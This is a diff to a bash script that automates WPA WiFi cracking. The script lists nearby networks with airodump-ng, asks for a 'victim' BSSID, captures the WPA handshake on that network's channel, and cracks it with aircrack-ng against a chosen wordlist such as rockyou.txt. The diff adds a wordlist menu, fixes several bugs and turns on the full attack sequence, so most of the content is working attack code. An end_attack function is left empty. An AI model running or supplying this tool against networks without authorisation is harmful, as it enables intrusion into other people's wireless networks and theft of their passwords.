@@ -47,7 +47,8 @@ obtain_victim_info() {
 
 	x-terminal-emulator -e "airodump-ng -w dumpfiles/dump $INTERFACE" &
 
-        echo "\nNow displaying possible targets..."
+	echo
+        echo "Now displaying possible targets..."
         sleep 2
 
 	read -p "Enter target BSSID: " APMAC
@@ -66,7 +67,8 @@ obtain_victim_info() {
 # Obtains the specific channel which the given BSSID is on
 obtain_channel() {
 
-	echo "\nRetrieving $APMAC channel..."
+	echo
+	echo "Retrieving $APMAC channel..."
 	sleep 1
 
 	# Obtains the channel of the input BSSID from the dump files of the airodump-ng above
@@ -83,7 +85,8 @@ wpa_handshake() {
 	local HSHAKE
 	local CRACKPID DUMPPID
 
-	echo "\nAttempting to capture packets on channel $CH..."
+	echo
+	echo "Attempting to capture packets on channel $CH..."
 
 	# Displays airodump-ng and captured packet info for user on channel $CH
 	x-terminal-emulator -e "airodump-ng -w crackfiles/psk -c $CH $INTERFACE" &
@@ -100,7 +103,7 @@ wpa_handshake() {
 	        sleep 5
 
 		# Prints to output.txt if WPA handshake was found
-		aircrack-ng -w wordlists/rockyou.txt -b $APMAC crackfiles/psk*.cap > output.txt &
+		aircrack-ng -w wordlists/rockyou.txt -b $APMAC crackfiles/psk*.cap > dumpfiles/output.txt &
 		sleep 1
 
 		# Obtains PID of aircrack process above and will kill it
@@ -111,10 +114,12 @@ wpa_handshake() {
 		fi
 
 		# If HSHAKE is not null, then WPA handshake was not found
-		HSHAKE=$(grep "No valid WPA handshakes found" output.txt)
-		if [ -n $HSHAKE ]
+		HSHAKE=$(grep "No valid WPA handshakes found" dumpfiles/output.txt)
+		if [ -n "$HSHAKE" ]
 		then
-			echo "$HSHAKE\n"
+			echo
+			echo "$HSHAKE"
+			echo
 		fi
 
 	done
@@ -122,6 +127,8 @@ wpa_handshake() {
 	# Once WPA handshake has been found, airodump-ng is no longer needed
 	DUMPPID=`ps -ef | grep "\bairodump-ng\b" | awk '{print $2}'`
 	kill 15 $DUMPPID
+
+	echo WPA handshake has been found!
 
 }
 
@@ -132,20 +139,44 @@ wordlist_crack() {
 	cd wordlists
 	WORDLISTS=(*)
 
-	#for loops n shit
-	#x-terminal-emulator -e "aircrack-ng -w wordlists/rockyou.txt -b $APMAC crackfiles/psk*.cap"
+	COUNT=0
 
+	echo "Wordlists available:"
+	echo
+	for WORDLIST in "${WORDLISTS[@]}"
+	do
+		((COUNT++))
+		echo $COUNT. $WORDLIST
+	done
+
+
+	# Allows user to choose available wordlists
+	echo
+	read -p "Enter choice [1-${#WORDLISTS[@]}]: " CHOICE
+	((CHOICE--))
+
+	WORDLIST=${WORDLISTS[$CHOICE]}
+
+	echo Now using wordlist: $WORDLIST...
+	sleep 1
+	cd ..
+
+	x-terminal-emulator -e "aircrack-ng -w wordlists/$WORDLIST -b $APMAC crackfiles/psk*.cap"
+}
+
+#MAKE THIS TOMORROW!!!
+end_attack() {
+	#kills any other processes (any aircracks, airdumps left)
 }
 
 #-------------------------------#
 #	MAIN EXECUTION		#
 #-------------------------------#
 
-#obtain_interface
-#monitor_mode
-#obtain_victim_info
-#obtain_channel
-	#HAVE IT DELETE DUMPFILES IN DUMP FOLDER AFTER CHANNEL IS FOUND
-	#PROMPT USER TO ENTER VALID NON-TAKEN NAME FOR PSK FILES
-#wpa_handshake
+obtain_interface
+monitor_mode
+obtain_victim_info
+obtain_channel
+wpa_handshake
+	#ADD AN OPTION TO INCLUDE NAME OF PSK FILE
 wordlist_crack
